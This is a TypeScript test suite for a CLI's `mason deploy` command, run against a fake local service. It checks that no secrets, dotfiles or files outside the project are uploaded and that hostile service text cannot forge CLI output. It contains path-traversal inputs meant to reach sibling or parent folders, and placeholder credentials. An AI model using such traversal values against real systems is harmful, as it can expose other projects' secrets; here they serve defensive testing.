/**
 * `mason deploy` AGAINST A FAKE HOSTED SERVICE (no network: an http server of this test's on 127.0.0.1, which plain
 * http may name): the real CLI as a child process, run in a project folder of its own, its service `MASON_CLOUD_URL`,
 * its home a temp folder. The contract is docs/HOSTED-API.md "Deploying a project"; what each test holds is in its
 * name. Every run's stdout and stderr is held to never carrying a token (`mason`, and the last test).
 */
import { test, after } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as http from "node:http";
import * as os from "node:os";
import * as path from "node:path";
import { createHash, randomBytes } from "node:crypto";
import { matrixEnv, runMason, type Answer } from "./cli-matrix.ts";
import { projectFiles } from "../src/lib/project-files.ts";
import { exitOf, FAILURE_CODES, type FailureCode } from "../src/cli/command.ts";
import { bodyCovered, bodyShown, echoForms, echoToken, inputsOf, measureGate, runForms, runToken, seen, SERVED, showsRun } from "./hosted-fake.ts";
import { pathToFileURL } from "node:url";

const newToken = (kind: "pat" | "ci" = "pat"): string => `masondata_${kind}_${randomBytes(32).toString("base64url")}`;
const SECRETS: string[] = [];
const ANSWERS: Answer[] = [];
const made: string[] = [];
after(() => { for (const d of made) fs.rmSync(d, { recursive: true, force: true }); });

interface Req { method: string; path: string; search: string; headers: http.IncomingHttpHeaders; body: string; at: number }
/** `json`: a JSON body as text (one too deep for JSON.stringify to write); `raw`: a body that is not JSON. */
type Reply = { status: number; body?: unknown; raw?: string; json?: string; headers?: Record<string, string> } | "drop";
interface Script {
  /** the POST's answer, or the n-th POST's (0-based) */
  post?: Reply | ((n: number) => Reply);
  /** the n-th GET's answer (0-based) */
  get?: (n: number) => Reply;
  /** the answer to GET /v1/replicas/acme/shop, the replica's Mason asked before the POST (none: 404, as before there was one) */
  replica?: Reply;
}
/** The replica's own path: its Mason is asked there before a deploy is sent (docs/HOSTED-API.md). */
const REPLICA_PATH = "/v1/replicas/acme/shop";

const CREATED = "2026-11-02T10:00:00Z";
const ID = "dep_01abc";
/** The id of a deploy sent again (a new POST is a new deploy). */
const ID2 = "dep_02def";
const queued: Reply = { status: 201, body: { deploy: { id: ID, status: "queued", createdAt: CREATED } }, headers: { "retry-after": "1" } };
const at = (status: string, more: Record<string, unknown> = {}): Reply => ({ status: 200, headers: { "retry-after": "1" },
  body: { deploy: { id: ID, status, createdAt: CREATED, ...(["running", "refused", "failed"].includes(status) ? { finishedAt: "2026-11-02T10:01:00Z" } : {}), ...more } } });

/** A fake service: answers as `script` says, records every request. */
async function fakeService(script: Script): Promise<{ url: string; requests: Req[]; close: () => Promise<void> }> {
  const requests: Req[] = [];
  let gets = 0, posts = 0;
  const server = http.createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (b: Buffer) => chunks.push(b));
    req.on("end", () => {
      const u = new URL(req.url ?? "/", "http://x"), p = u.pathname;
      requests.push({ method: req.method ?? "", path: p, search: u.search, headers: req.headers, body: Buffer.concat(chunks).toString("utf8"), at: Date.now() });
      const reply: Reply = req.method === "POST" && p === "/v1/replicas/acme/shop/deploys" ? (typeof script.post === "function" ? script.post(posts++) : script.post ?? queued)
        : req.method === "GET" && [ID, ID2].some((id) => p === `/v1/replicas/acme/shop/deploys/${id}`) ? (script.get ?? (() => at("running")))(gets++)
        : req.method === "GET" && p === REPLICA_PATH && script.replica !== undefined ? script.replica
        : { status: 404, body: { error: { code: "not_found", message: "no such endpoint" }, next: [] } };
      if (reply === "drop") { req.socket.destroy(); return; }
      const sent = reply.raw ?? reply.json ?? (reply.body === undefined ? "" : JSON.stringify(reply.body));
      // (a body over 1 MB is the refusal at its documented largest, synthetic names that carry no token: read for every
      // token of this file by `inputsOf`, it would take minutes)
      SERVED.push(JSON.stringify(reply.headers ?? {}), sent.length > 1_000_000 ? "" : sent);
      res.writeHead(reply.status, { "content-type": reply.raw === undefined ? "application/json" : "text/html", ...reply.headers });
      res.end(sent);
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as { port: number }).port;
  return { url: `http://127.0.0.1:${port}`, requests, close: () => new Promise((resolve) => { server.closeAllConnections(); server.close(() => resolve()); }) };
}

const SOURCE = "kind: postgres\nurl: ${DATABASE_URL}\nsync: off\ntables:\n  orders: {}\n  customers:\n    columns: [id, name]\n";
const ROLES = "default: everything\nroles:\n  everything:\n    tables: all\n  agent:\n    tables:\n      orders: {}\n";
const DAILY = "kind: scheduled\ntarget_lag: 5m\nsql: |\n  SELECT count(*) AS n FROM orders\n";

/** A temp folder of the test's own. */
function temp(prefix: string): string {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  made.push(d);
  return fs.realpathSync(d);
}

/** A project folder as `mason init` leaves one (its config, its sources file, mason.yml, roles.yml), with `files` more
 *  under mason/ (relative path → text; null removes one). */
function project(files: Record<string, string | Buffer | null> = {}): { root: string; folder: string } {
  const root = temp("mason-deploy-");
  fs.mkdirSync(path.join(root, ".mason"), { mode: 0o700 });
  fs.writeFileSync(path.join(root, ".mason", "config.json"), JSON.stringify({ name: "shop", folder: "mason", remote: false, apiKey: "k".repeat(48) }), { mode: 0o600 });
  const folder = path.join(root, "mason");
  const all: Record<string, string | Buffer | null> = { "sources/shop.yml": SOURCE, "mason.yml": "version: 0.7.0\n", "roles.yml": ROLES, ...files };
  for (const [rel, text] of Object.entries(all)) {
    if (text === null) continue;
    fs.mkdirSync(path.dirname(path.join(folder, rel)), { recursive: true });
    fs.writeFileSync(path.join(folder, rel), text);
  }
  return { root, folder };
}

const envFor = (h: string, url: string, extra: Record<string, string> = {}): Record<string, string> => matrixEnv({ HOME: h, PATH: path.dirname(process.execPath), MASON_CLOUD_URL: url, ...extra });

/** The terminal a run is given (`{ terminal: 80 }`): a preload that makes its stdout and stderr say they are a terminal
 *  that wide, colour off (as tests/hosted-fake.ts gives login's runs; nothing in src/ reads a test's variable). */
function terminalEnv(width: number, typing = false): Record<string, string> {
  const dir = temp("mason-terminal-");
  const hook = path.join(dir, "terminal.mjs");
  // `typing`: a person types at it, so its stdin says it is the terminal too
  fs.writeFileSync(hook, `${typing ? "Object.defineProperty(process.stdin, \"isTTY\", { value: true, configurable: true });\n" : ""}for (const s of [process.stdout, process.stderr]) {
  Object.defineProperty(s, "isTTY", { value: true, configurable: true });
  Object.defineProperty(s, "columns", { value: ${width}, configurable: true });
}
`);
  return { NODE_OPTIONS: `--import=${pathToFileURL(hook).href}`, NO_COLOR: "1" };
}

/**
 * THE LINES MASON DEPLOY BEGINS, all of them (tests/hosted-fake.ts's rule for login, in deploy's own words): a line that
 * begins otherwise is a value's — the service's text took a line's start. On a terminal too narrow for one, the CLI
 * breaks it at a space (src/cli/command.ts strictLines), so a line may also be a WORD-PREFIX of one ("✗ mason",
 * "  mason deploy"). Besides these: a blank, the one `Next:`, a continuation indented 4 or more, and the usage of a
 * wrong line (the CLI's text, read no further).
 */
const STEP_WORDS = ["Queued: ", "Applying: ", "Starting: ", "Running: ", "Refused by Mason on the replica", "The deploy failed"];
const FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"];
const HEADS: readonly string[] = [
  "Deployed to ", "Would send ", "Sent ", "✘ mason deploy: ", "✗ mason deploy: ",
  ...STEP_WORDS.flatMap((w) => [`  ${w}`, ...["✔", "✓", "✘", "✗", ...FRAMES].map((m) => `${m} ${w}`)]),
  "  the service could not say more just now ", "  ! ", "using MASON_REPLICA=acme/shop ",
  ...["  ", ...["✔", "✓", "✘", "✗", ...FRAMES].map((m) => `${m} `)].map((m) => `${m}Waiting to send the deploy: `),
  ...["deploy", "service", "files", "took", "why", "fix"].map((l) => `  ${l} `),
  // what the deploy changes, shown before it is sent (a row each), and the question a removal asks
  "What the deploy changes on ", ...["adds", "removes", "changes"].map((v) => `  ${v} `), "Removing ", "> ",
  // a service's refusal of a removal not confirmed, naming what it removes, and the question it asks
  "The service did not take deploy ", "Any synced table ",
];
/** The steps under Next:, the CLI's own, as the start of their line. */
const STEP_HEADS: readonly string[] = ["  mason deploy --replica acme/shop", "  mason replica status acme/shop", "  mason replica upgrade acme/shop", "  mason replica list acme", "  mason deploy --replica <org>/<name>", "  mason deploy --help", "  mason login", "  mason init",
  "  unset MASON_CLOUD_URL", "  chmod 600 ", "  chmod 700 "];
/** A dry run's row begins with a file's path, as this test's projects name them (this machine's own words, never the
 *  service's): on a narrow terminal the path itself is broken, so its row may begin with a part of it. */
const DRY_PATHS = ["generated_tables/daily.yml", "generated_tables/weekly.yml", "mason.yml", "roles.yml", "sources/shop.yml"];
const dryRow = (line: string): boolean => {
  const m = /^ {2}(\S+)( |$)/.exec(line);
  return m !== null && DRY_PATHS.some((p) => p === m[1] || (p.startsWith(m[1]!) && m[2] === ""));
};

/** Whether `line` is begun as one of `heads` begins, or is a word-prefix of one (the rest broken onto continuations). */
const begunAs = (line: string, heads: readonly string[]): boolean => heads.some((h) => {
  if (line.startsWith(h)) return h.endsWith(" ") || line.length === h.length || /^\s/.test(line.slice(h.length));
  const l = line.trimEnd();
  return l.trim() !== "" && h.startsWith(l) && (h.length === l.length || h[l.length] === " ");
});

/** What is wrong with what a person sees of one stream of deploy (`seen`, at `width` on a terminal): a line it did not
 *  begin, a second Next:, a failure where there is none or a second, a step under Next: that is not its own, a line the
 *  terminal broke. `failed`: this is the stderr of a run that failed, which then holds exactly one failure. */
function deploySeenProblems(text: string, width: number | null, failed: boolean | null): string[] {
  const p: string[] = [];
  const dry = /^Would( |\n)/.test(text);
  let afterNext = false, nexts = 0, failures = 0;
  for (const { line, byTerminal } of seen(text, width)) {
    if (byTerminal) p.push(`the terminal broke a line, so a line begins where a value chose: ${JSON.stringify(line)}`);
    if (/^usage: mason deploy( |$)/.test(line) || line === "usage:") break;
    if (line.trim() === "") continue;
    if (line === "Next:") { nexts++; afterNext = true; continue; }
    if (/^ {4,}\S/.test(line)) continue;
    if (/^[✘✗] mason/.test(line)) failures++;
    if (afterNext && /^ {2}\S/.test(line)) { if (!begunAs(line, STEP_HEADS)) p.push(`a step the CLI does not give: ${JSON.stringify(line)}`); continue; }
    if (!begunAs(line, HEADS) && !(dry && dryRow(line))) p.push(`a line the CLI does not begin: ${JSON.stringify(line)}`);
  }
  if (nexts > 1) p.push(`${nexts} Next: headings`);
  if (failed !== null && failures !== (failed ? 1 : 0)) p.push(`${failures} failures, where the run ${failed ? "failed once" : "did not fail"}`);
  else if (failures > 1) p.push(`${failures} failures`);
  return p;
}

/** Every step mason deploy gives, in every state: its own, never the service's. */
const OWN_STEP = /^ {2}(mason deploy --replica (acme\/shop|<org>\/<name>)|mason replica (status|upgrade) acme\/shop|mason replica list acme|mason deploy --help|mason login|mason init|unset MASON_CLOUD_URL|chmod (600|700) \S+)(\s|$)/;

/**
 * One run in `cwd`, held at once to carrying no secret on either stream, and to the service's values never shaping it
 * (#481's rule, as tests/cli-login.test.ts holds login to it): a failure's code is one of the CLI's and its exit that
 * code's; no line begins with what a hostile value carried (FORGED); each stream has one Next: at most, every step under
 * it the CLI's; and no --json string holds a line break.
 */
async function mason(cwd: string, argv: string[], env: Record<string, string>, o: { timeoutMs?: number; terminal?: number; input?: string } = {}): Promise<Answer> {
  const given = inputsOf([cwd], argv, env);
  const ran = await runMason(cwd, argv, o.terminal ? { ...env, ...terminalEnv(o.terminal, o.input !== undefined) } : env, o.timeoutMs ?? 60_000, undefined, o.input);
  // what a person sees at a terminal they type at: the terminal echoes the line typed after the prompt ("> ")
  const at = o.input === undefined || !o.terminal ? -1 : ran.stderr.indexOf("\n> ") + 1;
  const a = at <= 0 ? ran : { ...ran, stderr: `${ran.stderr.slice(0, at + 2)}${o.input!.split("\n")[0]}${o.input!.includes("\n") ? "\n" : ""}${ran.stderr.slice(at + 2)}` };
  ANSWERS.push(a);
  const line = `mason ${argv.join(" ")}${o.terminal ? ` (a terminal ${o.terminal} wide)` : ""}`;
  if (argv.includes("--json") && a.code !== 0) {
    const e = (JSON.parse(a.stdout) as { error?: { code?: string } }).error;
    assert.ok(e?.code !== undefined && Object.hasOwn(FAILURE_CODES, e.code), `${line}: code ${e?.code} is not one of FAILURE_CODES`);
    assert.equal(a.code, exitOf({ message: "", code: e.code as FailureCode }), `${line}: exit ${a.code}, where ${e.code} exits ${exitOf({ message: "", code: e.code as FailureCode })}`);
  }
  // every line a person sees is one the CLI began: visual lines at the terminal's width for a run on a terminal, the
  // logical lines of a pipe otherwise; under --json, stderr alone (stdout is the data)
  for (const [stream, text] of argv.includes("--json") ? [["stderr", a.stderr]] as const : [["stdout", a.stdout], ["stderr", a.stderr]] as const) {
    assert.ok(!text.split("\n").some((l) => /^\s*FORGED/.test(l)), `${line}: a line of ${stream} begins with the service's text:\n${text}`);
    assert.deepEqual(deploySeenProblems(text, o.terminal ?? null, stream === "stderr" && !argv.includes("--json") ? a.code !== 0 : null), [], `${line}: what a person sees of its ${stream}:\n${text}`);
  }
  if (argv.includes("--json")) {
    const v = JSON.parse(a.stdout) as { next: Array<{ command: string }>; error?: { code?: string } };
    const walk = (x: unknown, at: string): void => {
      if (typeof x === "string") assert.doesNotMatch(x, /[\n\r\u0085\u2028\u2029]/, `${line} --json ${at} holds a line break: ${JSON.stringify(x)}`);
      else if (Array.isArray(x)) x.forEach((y, i) => walk(y, `${at}[${i}]`));
      else if (typeof x === "object" && x !== null) for (const [k, y] of Object.entries(x)) walk(y, `${at}.${k}`);
    };
    // the one exception: a refusal of the project's own files (bad_source, bad_roles) lists its mistakes a line each in
    // why, or the file to write in fix, as every command does (sourceFailure, rolesFailure, readSource) — this machine's
    // words, met before anything is sent; no service failure has those codes (codeOfStatus, failureShape)
    const local = ["bad_source", "bad_roles"].includes(v.error?.code ?? "");
    walk(local ? { ...v, error: { ...v.error, why: "", fix: "" } } : v, "");
    for (const n of v.next) assert.match(`  ${n.command}`, OWN_STEP, `${line} --json: a step the CLI does not give: ${n.command}`);
  }
  for (const s of SECRETS) {
    assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `${line} printed a secret:\n${a.stdout}\n${a.stderr}`);
    assert.ok(!a.stdout.includes(s.slice(-43)) && !a.stderr.includes(s.slice(-43)), `${line} printed a secret's body`);
  }
  // a quarter in some form, of a token this run was given (`inputsOf`): chance meets one of hundreds now and then
  for (const s of given.seen(SECRETS)) {
    assert.ok(!bodyShown(`${a.stdout}\n${a.stderr}`, s, [cwd, env.HOME, env.MASON_CLOUD_URL]), `${line} printed more than a quarter of a secret's body, in some form:\n${a.stdout}\n${a.stderr}`);
  }
  return a;
}

/** A run against a fresh fake, signed in by MASON_TOKEN; the fake's requests to the deploys with it (`requests`), and its
 *  questions of the replica's Mason apart (`asked`). */
async function deployWith(script: Script, cwd: string, argv: string[], extra: Record<string, string> = {}, o: { terminal?: number; input?: string; timeoutMs?: number } = {}): Promise<{ a: Answer; requests: Req[]; asked: Req[]; url: string; token: string; home: string }> {
  // a token the caller gives is its own to record
  const token = extra.MASON_TOKEN ?? newToken("ci");
  if (extra.MASON_TOKEN === undefined) SECRETS.push(token);
  const fake = await fakeService(script);
  try {
    const h = temp("mason-home-");
    const a = await mason(cwd, ["deploy", ...argv], envFor(h, fake.url, { MASON_TOKEN: token, ...extra }), o);
    return { a, requests: fake.requests.filter((r) => r.path !== REPLICA_PATH), asked: fake.requests.filter((r) => r.path === REPLICA_PATH), url: fake.url, token, home: h };
  } finally { await fake.close(); }
}

const sha = (b: Buffer | string): string => createHash("sha256").update(b).digest("hex");
/** A run's stderr after the plan's line where the fake says nothing of what the replica runs (it answers 404): the line
 *  that says the plan cannot be shown, which every deploy begins with before it sends (its own tests below). */
const afterPlan = (stderr: string): string => stderr.replace(/^What the deploy changes on acme\/shop cannot be shown: the service answered 404 when asked what acme\/shop runs\n/, "");

test("mason deploy: the files sent are projectFiles of the project folder, whole, each with its sha256 — never .env, .mason/, a dotfile or a file that is not YAML; then the replica runs it", async () => {
  const { root, folder } = project({
    "generated_tables/daily.yml": DAILY,
    // beside the project: none of these is sent
    ".env": "DATABASE_URL=postgres://u:hunter2@db.example/prod\n",
    ".mason/state.yml": "x: 1\n",
    ".editor.yml": "a: 1\n",
    "notes.txt": "a note\n",
    "settings.json": "{ \"readme\": 1 }\n",
  });
  fs.writeFileSync(path.join(root, ".env"), "DATABASE_URL=postgres://u:hunter2@db.example/prod\n");
  fs.writeFileSync(path.join(root, ".mason", "duck.yml"), "x: 1\n");
  const { a, requests, token } = await deployWith({}, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 0, a.stderr);
  const posts = requests.filter((r) => r.method === "POST");
  assert.equal(posts.length, 1);
  const post = posts[0]!;
  assert.equal(post.path, "/v1/replicas/acme/shop/deploys");
  assert.equal(post.headers.authorization, `Bearer ${token}`);
  assert.equal(post.headers["content-type"], "application/json");
  assert.match(String(post.headers["user-agent"]), /^mason-cli\//);
  const body = JSON.parse(post.body) as { files: Array<{ path: string; sha256: string; content: string }>; client: { version: string } };
  assert.deepEqual(Object.keys(body), ["files", "client"]);
  assert.deepEqual(body.client, { version: "dev" });
  // the authority: the one list of a project's files, as paths relative to the folder with / between parts
  const expected = projectFiles(folder).map((f) => path.relative(folder, f).split(path.sep).join("/"));
  assert.deepEqual(expected, ["generated_tables/daily.yml", "mason.yml", "roles.yml", "sources/shop.yml"]);
  assert.deepEqual(body.files.map((f) => f.path), expected);
  for (const f of body.files) {
    const bytes = fs.readFileSync(path.join(folder, f.path));
    assert.deepEqual(Object.keys(f), ["path", "sha256", "content"]);
    assert.equal(f.content, bytes.toString("utf8"));
    assert.equal(f.sha256, sha(bytes));
  }
  assert.doesNotMatch(post.body, /hunter2|a note|readme|x: 1|a: 1/, "nothing beside the project's files");
  // the outcome, once
  assert.equal(requests.filter((r) => r.method === "GET").length, 1);
  assert.match(a.stdout, /^Deployed to acme\/shop: the replica runs it\n {2}deploy {4}dep_01abc\n {2}service {3}http:\/\/127\.0\.0\.1:\d+\n {2}files {5}4 \(\d+ bytes\)\n {2}took {6}\d+ s\n\nNext:\n {2}mason deploy --replica acme\/shop +deploy again, after the next edit\n$/);
});

test("mason deploy: no database is read and no .env needed — the URL is the replica's environment's", async () => {
  // ${DATABASE_URL} set nowhere: mason start would refuse it, a deploy sends it (the replica's environment names it)
  const { root } = project();
  const { a, requests } = await deployWith({}, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(a.code, 0, a.stdout + a.stderr);
  assert.equal(requests.filter((r) => r.method === "POST").length, 1);
  const v = JSON.parse(a.stdout) as Record<string, unknown>;
  assert.deepEqual(Object.keys(v), ["dryRun", "replica", "service", "files", "totalBytes", "warnings", "plan", "planUnknown", "confirmed", "deploy", "next"]);
  assert.equal(v.dryRun, false);
  assert.equal(v.confirmed, null, "nothing removed, nothing confirmed");
  assert.equal(v.plan, null, "a service that does not say what the replica runs: no plan");
  assert.equal(v.planUnknown, "the service answered 404 when asked what acme/shop runs");
  assert.equal(v.replica, "acme/shop");
  assert.deepEqual(v.deploy, { id: ID, status: "running", phase: null, createdAt: CREATED, finishedAt: "2026-11-02T10:01:00Z" });
  assert.equal(a.stderr, "", "--json prints no progress");
});

test("mason deploy --dry-run: each path, its size and its sha256, and no request at all (no login needed)", async () => {
  const { root, folder } = project();
  const fake = await fakeService({});
  try {
    const env = envFor(temp("mason-home-"), fake.url);
    const a = await mason(root, ["deploy", "--replica", "acme/shop", "--dry-run"], env);
    assert.equal(a.code, 0, a.stderr);
    const rows = ["mason.yml", "roles.yml", "sources/shop.yml"].map((p) => {
      const b = fs.readFileSync(path.join(folder, p));
      return { path: p, size: b.length, sha256: sha(b) };
    });
    const w = Math.max(...rows.map((r) => r.path.length)), sw = Math.max(...rows.map((r) => `${r.size} bytes`.length));
    const total = rows.reduce((n, r) => n + r.size, 0);
    assert.equal(a.stdout, `Would send 3 files, ${total} bytes, to acme/shop on ${fake.url}; nothing was sent\n` +
      rows.map((r) => `  ${r.path.padEnd(w)}   ${`${r.size} bytes`.padStart(sw)}   sha256 ${r.sha256}\n`).join("") +
      `What the deploy changes on acme/shop cannot be shown: this machine is not signed in to ${fake.url}\n` +
      "\nNext:\n  mason deploy --replica acme/shop              send it\n");
    const j = await mason(root, ["deploy", "--dry-run", "--json"], env);
    assert.equal(j.code, 0, j.stdout);
    const v = JSON.parse(j.stdout) as { dryRun: boolean; replica: unknown; files: unknown; totalBytes: number; deploy: unknown };
    assert.equal(v.dryRun, true);
    assert.equal(v.replica, null, "a dry run needs no replica");
    assert.deepEqual(v.files, rows);
    assert.equal(v.totalBytes, total);
    assert.equal(v.deploy, null);
    assert.deepEqual([(v as { plan?: unknown }).plan, (v as { planUnknown?: unknown }).planUnknown], [null, "no replica is named (--replica <org>/<name>, signed in, shows it)"]);
    assert.deepEqual(fake.requests, [], "a dry run makes no request");
  } finally { await fake.close(); }
});

test("mason deploy: a project mason start would refuse is refused here, in the failure shape, and nothing is sent", async () => {
  const cases: Array<[string, Record<string, string | null>, RegExp, string]> = [
    ["a sources file's mistake", { "sources/shop.yml": "kind: postgres\nurl: ${DATABASE_URL}\ntabels: {}\n" }, /^✗ mason deploy: mason\/sources\/shop\.yml has 2 mistakes|^✗ mason deploy: mason\/sources\/shop\.yml: /m, "bad_source"],
    ["no sources file", { "sources/shop.yml": null }, /^✗ mason deploy: this project names no database: mason\/sources\/ has no source file$/m, "bad_source"],
    ["a role naming a table the sources file does not sync", { "roles.yml": "roles:\n  agent:\n    tables:\n      invoices: {}\n" }, /^✗ mason deploy: mason\/roles\.yml: roles\.agent\.tables\.invoices: public\.invoices is not a table the sources file syncs/m, "bad_roles"],
    ["a mason.yml that is not a pin", { "mason.yml": "version: banana\n" }, /^✗ mason deploy: .*mason\.yml: version "banana" is not a version/m, "refused"],
    ["a url: written with its password", { "sources/shop.yml": "kind: postgres\nurl: postgres://app:s3cret@db.example:5432/shop\ntables: {}\n" }, /^✗ mason deploy: mason\/sources\/shop\.yml: url: is written with its password$/m, "refused"],
  ];
  for (const [what, files, said, code] of cases) {
    const { root } = project(files);
    const { a, requests } = await deployWith({}, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, `${what}: ${a.stderr}`);
    assert.match(a.stderr, said, what);
    assert.doesNotMatch(a.stderr, /s3cret/, `${what}: the password is never repeated`);
    assert.deepEqual(requests, [], `${what}: nothing sent`);
    const j = await deployWith({}, root, ["--replica", "acme/shop", "--json"]);
    assert.equal((JSON.parse(j.a.stdout) as { error: { code: string } }).error.code, code, what);
    assert.deepEqual(j.requests, [], `${what}: nothing sent`);
  }
  // the password refusal says the way out whole
  const { root } = project({ "sources/shop.yml": "kind: postgres\nurl: postgres://app:s3cret@db.example:5432/shop\ntables: {}\n" });
  const { a } = await deployWith({}, root, ["--replica", "acme/shop"]);
  assert.equal(a.stderr, "✗ mason deploy: mason/sources/shop.yml: url: is written with its password\n" +
    "  why   a deploy sends the project's files to the replica, which keeps them: a password is never one of them\n" +
    "  fix   write url: ${DATABASE_URL} in mason/sources/shop.yml, and set DATABASE_URL on the replica (its own environment, on the service); keep the URL here in .env\n");
});

test("mason deploy: a refused generated table is said and sent, as mason start says it and goes on", async () => {
  const { root } = project({ "generated_tables/weekly.yml": "kind: live\nsql: SELECT 1\n" });
  const { a, requests } = await deployWith({}, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 0, a.stderr);
  assert.match(a.stderr, /^ {2}! mason\/generated_tables\/weekly\.yml: kind: live isn't available yet\.$/m);
  const body = JSON.parse(requests.find((r) => r.method === "POST")!.body) as { files: Array<{ path: string }> };
  assert.ok(body.files.some((f) => f.path === "generated_tables/weekly.yml"));
});

test("mason deploy: the bounds — a file over 256 KiB, the files over 1 MiB, a file not UTF-8, a link out of the folder — refused with the sizes, nothing sent", async () => {
  const big = project({ "notes/big.yml": `x: "${"a".repeat(256 * 1024)}"\n` });
  let r = await deployWith({}, big.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.equal(r.a.stderr, "✗ mason deploy: mason/notes/big.yml is 262,150 bytes, over the 262,144 bytes (256 KiB) a deploy sends of one file\n" +
    "  why   a project's files name tables, columns and SQL: none is that large\n" +
    "  fix   shorten it, or move it out of mason/ if Mason does not read it\n");
  assert.deepEqual(r.requests, []);

  const many: Record<string, string> = {};
  for (let i = 0; i < 5; i++) many[`notes/n${i}.yml`] = `x: "${"a".repeat(250 * 1024)}"\n`;
  const total = project(many);
  r = await deployWith({}, total.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  const sent = projectFiles(total.folder).reduce((n, f) => n + fs.statSync(f).size, 0);
  assert.match(r.a.stderr, new RegExp(`^✗ mason deploy: the project's files are ${sent.toLocaleString("en-US")} bytes in all, over the 1,048,576 bytes \\(1 MiB\\) a deploy sends\n {2}why {3}the largest: notes/n0\\.yml 256,006 bytes, `));
  assert.deepEqual(r.requests, []);

  const latin = project({ "notes/latin.yml": Buffer.from([0x61, 0x3a, 0x20, 0xe9, 0x0a]) });
  r = await deployWith({}, latin.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.match(r.a.stderr, /^✗ mason deploy: mason\/notes\/latin\.yml is not UTF-8 text$/m);
  assert.deepEqual(r.requests, []);

  const outside = temp("mason-outside-");
  fs.writeFileSync(path.join(outside, "secret.yml"), "token: abc\n");
  const linked = project();
  fs.symlinkSync(path.join(outside, "secret.yml"), path.join(linked.folder, "other.yml"));
  r = await deployWith({}, linked.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.equal(r.a.stderr, `✗ mason deploy: mason/other.yml is a symbolic link to ${path.join(outside, "secret.yml")}, outside the project folder\n` +
    "  why   a deploy sends the project folder's own files, and never follows a link out of it\n" +
    "  fix   put the file itself in mason/, or remove the link\n");
  assert.deepEqual(r.requests, []);

  // a project whose files are the application's folder itself: every YAML of the application would go
  const flat = project();
  fs.writeFileSync(path.join(flat.root, ".mason", "config.json"), JSON.stringify({ name: "shop", folder: ".", remote: false, apiKey: "k".repeat(48) }), { mode: 0o600 });
  for (const f of ["sources", "mason.yml", "roles.yml"]) fs.renameSync(path.join(flat.folder, f), path.join(flat.root, f));
  fs.writeFileSync(path.join(flat.root, "docker-compose.yml"), "services: { db: { environment: { POSTGRES_PASSWORD: hunter2 } } }\n");
  r = await deployWith({}, flat.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.match(r.a.stderr, /^✗ mason deploy: this project's files are its folder's own \(mason init --folder \.\), beside the application's$/m);
  assert.deepEqual(r.requests, []);

  // a link inside the folder is the file it names, sent under the link's path
  const inside = project();
  fs.symlinkSync(path.join(inside.folder, "roles.yml"), path.join(inside.folder, "roles-copy.yml"));
  r = await deployWith({}, inside.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 0, r.a.stderr);

  // a folder the readers follow and the list does not (a linked sources/): refused, never checked here and missing there
  const away = temp("mason-sources-");
  fs.writeFileSync(path.join(away, "shop.yml"), SOURCE);
  const folderLink = project({ "sources/shop.yml": null });
  fs.rmSync(path.join(folderLink.folder, "sources"), { recursive: true, force: true });
  fs.symlinkSync(away, path.join(folderLink.folder, "sources"));
  r = await deployWith({}, folderLink.root, ["--replica", "acme/shop"]);
  assert.equal(r.a.code, 1);
  assert.match(r.a.stderr, /^✗ mason deploy: mason\/sources\/shop\.yml is read by Mason, and is not among the files a deploy sends$/m);
  assert.deepEqual(r.requests, []);
});

test("mason deploy: the project's files must be a folder strictly inside its root — every spelling of the root itself or a place outside it is refused, nothing read or sent", async () => {
  // an application root inside a parent that holds YAML of its own (a CI file, a sibling's), with a project folder named
  // by config.json's "folder" — written by hand, as mason init refuses every outside spelling and writes "mason" itself
  const layout = (folder: (dirs: { app: string; parent: string; away: string }) => string): { app: string } => {
    const parent = temp("mason-parent-"), app = path.join(parent, "app"), away = temp("mason-away-");
    fs.mkdirSync(path.join(app, ".mason"), { recursive: true });
    fs.writeFileSync(path.join(app, ".mason", "config.json"), JSON.stringify({ name: "shop", folder: folder({ app, parent, away }), remote: false, apiKey: "k".repeat(48) }), { mode: 0o600 });
    // a valid project everywhere it might be read from: the refusal is the folder's, never a mistake of the files
    for (const at of [parent, app, path.join(app, "mason"), away, path.join(parent, "sibling", "mason")]) {
      fs.mkdirSync(path.join(at, "sources"), { recursive: true });
      fs.writeFileSync(path.join(at, "sources", "shop.yml"), SOURCE);
      fs.writeFileSync(path.join(at, "mason.yml"), "version: 0.7.0\n");
    }
    fs.writeFileSync(path.join(parent, "ci.yml"), "token: from-the-parent\n");
    fs.mkdirSync(path.join(parent, "sibling"), { recursive: true });
    fs.writeFileSync(path.join(parent, "sibling", "k8s.yml"), "secret: from-a-sibling\n");
    fs.writeFileSync(path.join(app, "docker-compose.yml"), "password: from-the-app\n");
    fs.writeFileSync(path.join(away, "elsewhere.yml"), "secret: from-elsewhere\n");
    return { app };
  };
  const outside: Array<[string, (d: { app: string; parent: string; away: string }) => string]> = [
    ["..", () => ".."], ["../", () => "../"], ["../sibling/mason", () => "../sibling/mason"], ["mason/../..", () => "mason/../.."],
    ["the parent, absolute", (d) => d.parent], ["another folder, absolute", (d) => d.away], ["../app/../..", () => "../app/../.."],
  ];
  const atRoot: Array<[string, (d: { app: string; parent: string; away: string }) => string]> = [
    [".", () => "."], ["./", () => "./"], ["", () => ""], ["mason/..", () => "mason/.."], ["the root, absolute", (d) => d.app], ["../app", () => "../app"],
  ];
  for (const [kind, cases] of [["outside", outside], ["root", atRoot]] as const) {
    for (const [what, folder] of cases) {
      const { app } = layout(folder);
      for (const argv of [["--replica", "acme/shop"], ["--replica", "acme/shop", "--dry-run"], ["--replica", "acme/shop", "--json"]]) {
        const { a, requests } = await deployWith({}, app, argv);
